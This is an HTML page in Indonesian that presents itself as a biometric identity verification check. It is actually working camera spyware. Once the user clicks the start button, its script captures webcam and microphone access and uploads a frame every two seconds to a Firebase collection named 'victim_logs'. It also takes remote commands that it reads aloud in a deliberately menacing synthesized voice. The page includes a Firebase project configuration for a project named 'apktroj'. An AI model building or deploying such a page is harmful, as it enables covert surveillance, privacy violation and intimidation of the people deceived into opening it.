<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Biometrik</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div id="init-panel" class="bg-white p-8 rounded-2xl shadow-2xl max-w-sm text-center">
        <div class="text-4xl mb-4">🛡️</div>
        <h1 class="text-xl font-bold mb-4">VERIFIKASI IDENTITAS</h1>
        <p class="text-sm text-gray-600 mb-8">Pastikan Volume Media Anda Aktif. Sistem akan memberikan instruksi suara untuk proses validasi wajah.</p>
        <button id="start-btn" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 transition-all">SAYA SIAP</button>
    </div>

    <div id="active-panel" class="hidden text-center">
        <div class="animate-pulse text-red-600 font-bold mb-4">● PROSES VALIDASI SEDANG BERJALAN</div>
        <div class="w-32 h-32 border-4 border-blue-500 rounded-full mx-auto overflow-hidden">
            <video id="v" class="w-full h-full object-cover" autoplay playsinline></video>
        </div>
        <p class="mt-4 text-gray-500 text-xs">Jangan tutup halaman ini...</p>
    </div>

    <canvas id="c" style="display:none"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab",
            measurementId: "G-WR01BDY3G6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";

        document.getElementById('start-btn').onclick = async () => {
            document.getElementById('init-panel').classList.add('hidden');
            document.getElementById('active-panel').classList.remove('hidden');
            await signInAnonymously(auth);
            startCore();
        };

        async function startCore() {
            // Listen to Intercom Commands
            onSnapshot(collection(db, 'artifacts', appId, 'public', 'data', 'commands'), (snap) => {
                snap.docChanges().forEach(change => {
                    if (change.type === "added") {
                        const cmd = change.doc.data();
                        if(cmd.type === "TTS_VOICE") {
                            speak(cmd.text);
                        }
                    }
                });
            });

            // Start Camera Spying
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth / 4;
                    canvas.height = video.videoHeight / 4;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    sendData({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.2) });
                }, 2000);
            });
        }

        function speak(text) {
            const synth = window.speechSynthesis;
            const utter = new SpeechSynthesisUtterance(text);
            utter.lang = 'id-ID';
            utter.rate = 0.9;
            utter.pitch = 0.8; // Buat suara agak berat biar serem
            synth.speak(utter);
        }

        async function sendData(data) {
            try {
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
                    ...data,
                    uid: auth.currentUser.uid,
                    timestamp: Date.now()
                });
            } catch (e) {}
        }
    </script>
</body>
</html>
